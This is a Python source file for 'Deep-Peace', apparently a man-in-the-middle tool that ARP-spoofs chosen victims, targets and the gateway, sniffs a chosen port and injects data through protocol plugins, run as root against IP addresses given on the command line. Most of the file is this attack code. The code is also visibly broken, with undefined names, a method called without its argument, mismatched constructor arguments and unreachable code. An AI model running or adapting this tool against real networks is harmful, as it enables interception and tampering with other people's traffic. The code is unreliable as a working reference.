#! /usr/bin/python3
import importlib
import argparse
import importlib.util
import platform
import signal
import sys
import os
import re
import time
import scapy.all as scapy
from lib import logger as liblog, sniffer as sniff
from lib.spoofing import Spoofer

# Regex for checking mac address
r_mac = re.compile('^(([0-9a-f]{2})(:(?!$)|$)){6}$', re.IGNORECASE)
# Regex for checking ip address
r_iadr = re.compile('^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$')
# Regex for checking port
r_port = re.compile('^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))$')

targets = 0
log     = None

class Target:
    name        = ""
    ip          = ""
    mac         = ""
    valid       = False
    def get_mac(self, ip) -> bool:
        global r_mac
        # ARP request
        req = scapy.ARP(pdst=ip)
        # Broadcast Ethernet layer
        brd = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        # Build the packet
        arp_req = brd / req
        # Wait for the response (2 seconds)
        res = scapy.srp(arp_req, timeout=2, verbose=False)[0]
        # getting the MAC
        self.mac = res[0][1].hwsrc
        if r_mac.match(self.mac):
            self.valid = True
        return self.valid

    def __init__(self, ip, name = ""):
        global r_iadr, r_mac, targets
        if len(name) == 0:
            name = "target"+str(targets)
        if r_iadr.match(ip):
            self.name   = name
            self.ip     = ip
            targets     = targets + 1
        else: log.print("bad ip address for target {} got: {}".format(name, ip))
        if not self.get_mac():
            log.print("failed to get mac address for target {}".format(name))
        else:
            log.print("new target defined with name {}".format(name))

# Dynamic Protocol Injector Sniffer (called Deep-Peace)
class DPIS:
    # define our instance variables
#   logger      = None
    sniffer     = None
    spoofer     = None
    firewall    = None
    protocol    = []

    # host interface we're listening to
    iface       = ""
    # host informations [ip, mac]
    host        = ["", ""]
    # protocol informations [[name, port]
    protoinfo   = []
    # gateway informations Target(gateway)
    gateway     = None
    # targets List[Target(), ...]
    targets     = []
    # victims List[Target(), ...]
    victims     = []
    # toggle stdin for incoming datas
    stdin       = False
    # enable socket to intercept datas
    socket      = None
    def __init__(self, iface, proto, target, spoof = False, firewall = False, *_):
        global r_port, log;
        self.iface      = iface
        self.host       = [scapy.get_if_addr(iface), scapy.get_if_hwaddr(iface)]
        log.print("current host informations:\n\tinterface:\t{}\n\tip:\t{}\n\tmac:\t{}".format(iface, self.host[0], self.host[1]))
        self.gateway    = Target(scapy.conf.route.route('0.0.0.0')[2], "gateway")
        i = 0
        for t in target:
            self.target.append(Target(t[0], "target" + str(i) if t[1] is None or len(t[1]) == 0 else t[1]))
            i = i + 1
        try:
            # If multiple protocol was specified, load and initialize every protocol
            if type(proto[0]) is not list:
                proto = [proto]
            for p in proto:
                # Split the port argument into protocol and port
                p = p.split(':')
                # Make sure port format is correct
                if not r_port.match(p[1]):
                    log.error("Invalid target port!")
                    sys.exit(2)
                self.protoinfo.append(p);
                self.protocol.append(importlib.util.find_spec("lib", "proto."+p[0]).Protocol(
                    self.host, self.victims, self.targets, self.gateway, self.stdin
                ))
        except:
            log.error("Protocol {} doesn't exist, please define it or choose another one.".format(self.proto[0]))
            sys.exit(2)
        log.debug("protocol {} selected on port {}".format(self.proto[0], self.proto[1]))
        if firewall:
            self.firewall = firewall
        if spoof:
            self.spoofer = Spoofer(self.host, 1)
            for victim in self.victims:
                self.spoofer.spoof(victim, self.gateway)
                for target in self.targets:
                    self.spoofer.spoof(victim, target)
            for target in self.targets:
                self.spoofer.spoof(target, self.gateway)
                for victim in self.victims:
                    self.spoofer.spoof(target, victim)
        self.sniffer = sniff.sniffer(self.victims[0], self.targets[0], self.iface, self.protoinfo[0][1], self.protocol)

    # Start instances and threads.
    def start(self) -> bool:
        global log
        self.protocol.start()
        if self.firewall is not None:
            log.print("Enabling firewall rules...")
        if self.spoofer is not None:
            log.print("Starting spoofer, please wait for a while...")
            self.spoofer.start()
        log.print("Sniffing on port {}".format(self.proto[1]))
        self.sniffer.start()

    # Stop threads and exit program.
    def stop(self, *_) -> None:
        global log
        log.print("Killing threads and exiting...")
        self.sniffer.stop()
        if self.spoofer is not None:
            self.spoofer.stop()
        if self.protocol is not None:
            self.protocol.stop()
        sys.exit(0)

    # Execute readline for specified protocol.
    def stdin(self) -> None:
        True

# Main function, parses every arguments and return dyn class
def main() -> DPIS:
    os.system('color')
    # import global settings(get all Var)
    global log, r_iadr
    print ("""
\x1b[0;92m      :::::::::  ::::::::: ::::::::::: :::::::: 
\x1b[1;32m     :+:    :+: :+:    :+:    :+:    :+:    :+: 
\x1b[0;32m    +:+    +:+ +:+    +:+    +:+    +:+         
\x1b[0;33m   +#+    +:+ +#++:++#+     +#+    +#++:++#++   
\x1b[1;33m  +#+    +#+ +#+           +#+           +#+ \x1b[0mby \x1b[0;31mN0x4z3r\x1b[0m, \x1b[0;36mRmalet
\x1b[0;93m #+#    #+# #+#           #+#    #+#    #+#\x1b[0;33;40m mitm
\x1b[0;93m#########  ###       ########### ########\x1b[0m

    Dynamic Protocols Injection and Spoofing
    (called Deep-Peace)""")
    #if platform.system() == "Windows":
    #    try:
    #        import pyuac
    #    #    if not pyuac.isUserAdmin():
    #    #        print("\x1b[0;31;40mThis program should be run as Administrator.\x1b[0m")
    #    #        #rc = pyuac.runAsAdmin()
    #    #        exit(1)
    #    except Exception as E:
    #        if type(E.args[0]) == str and "No module" in E.args[0]:
    #            module = E.args[0].split(' ')
    #            if "win32con" in module:
    #                module = "'pypiwin32'"
    #            print("\x1b[0;31;40mShould install {} on windows platform.\x1b[0m".format(module[len(module) - 1]))
    #        else:
    #            print(E)
    #        exit(1)
    # Make sure the script is being run as root
    if platform.system() != "Windows" and os.geteuid() != 0:
        print("\x1b[0;31;40mThis program should be run as root.\x1b[0m")
        exit(1)

    # Parser to handle command-line arguments
    parser = argparse.ArgumentParser()

    #Optionnal firewall settings
    firewall = parser.add_mutually_exclusive_group(required=False)
    firewall.add_argument("-f", "--firewall",
                        help="Create multiple firewall rules",
                        dest="firewall",
                        action='store_true')
    spoofing = parser.add_mutually_exclusive_group(required=False)
    spoofing.add_argument("-S", "--no-spoofing",
                        help="Disable ARP spoofing",
                        dest="spoofing",
                        action='store_false')
    # optionnal: control the verbosity of the program 0 = Silent 3 = most verbose
    parser.add_argument("-v", "--verbose",
                        help="Display more informations",
                        choices=[0, 1, 2, 3],
                        required=False,
                        default=0,
                        type=int)
    # Set the defaults values for optional arguments
    parser.set_defaults(firewall=False, spoofing=True)

    #Optional : Arg to write in a .pcap file
    #parser.add_argument("-w", "--write", help="create a pcap file.", required=False, default=False)
    # Optional : Arg to execute a terminal protocl via standard input 
    parser.add_argument("-s", "--stdin",
                        help="try to execute a terminal protocol.",
                        required=False,
                        default=False,
                        action='store_true')
    #Argument for the network interface listener
    parser.add_argument("iface", help="Set interface listening to")
    #Arguement for the port destination
    parser.add_argument("protocol", help="Define the protocol and port <name>:<port>")
    #Argument for the ip source
    parser.add_argument("target", help="List of targets ip address (most of cases server ip address)\n\t\t<target>[,<target>[,...]]")
    #Argument for the ip source
    parser.add_argument("victim", help="List of victims ip address\n\t\t<victim>[,<victim>[,...]]")

    # parse command-line argument
    args = parser.parse_args()
    # Create our logger instance
    log = liblog.Logger(args.verbose)

    if len(args.iface) == 0:
        log.error("Bad argument <iface> got empty value.")
        exit(1)
    else:
        ifaces = scapy.get_working_ifaces()
        if not args.iface in ifaces:
            log.error("Interface {} doesn't exist or isn't working. printing valid interfaces:\n\t{}".format(args.iface, ifaces))
            exit(1)

    if not ":" in args.protocol:
        log.error("Bad argument for <protocol> should specify <name>:<port>[, <name>:<port>]")
        exit(1)

    if len(args.targets) == 0:
        log.error("Bad argument for <target>")
        exit(1)
    elif ',' in args.target:
        args.target = args.target.split(',');
    else:
        args.target = [args.target]
    i = 0
    for t in args.target:
        if not r_iadr.match(t):
            log.error("Bad <target> number {} got {}".format(str(i), t))
            exit(1)
        i = i + 1

    if len(args.victim) == 0:
        log.error("Bad argument for <victim>")
        exit(1)
    elif "," in args.victim:
        args.victim = args.victim.split(",")
    else:
        args.victim = [args.victim]
    i = 0
    for v in args.victim:
        if not r_iadr.match(v):
            log.error("Bad <victim> number {} got {}".format(str(i), v))
            exit(1)
        i = i + 1

    return DPIS(
        args.iface,
        args.protocol,
        args.target,
        args.victim,
        args.spoofing,
        args.firewall
    );
    # While the programe is running, accepting stdin process incoming data
    while args.stdin:
        payload = sys.stdin.readline()
        ready = lpkt.psh(payload)
        lpkt.send(ready)

if __name__ == "__main__":
    if platform.system() == "Windows":
        time.sleep(4)
    # Call the main fonction
    program = main()
    # Catch interrupt signal and run exit functions
    signal.signal(signal.SIGINT, program.exit)
    program.start()
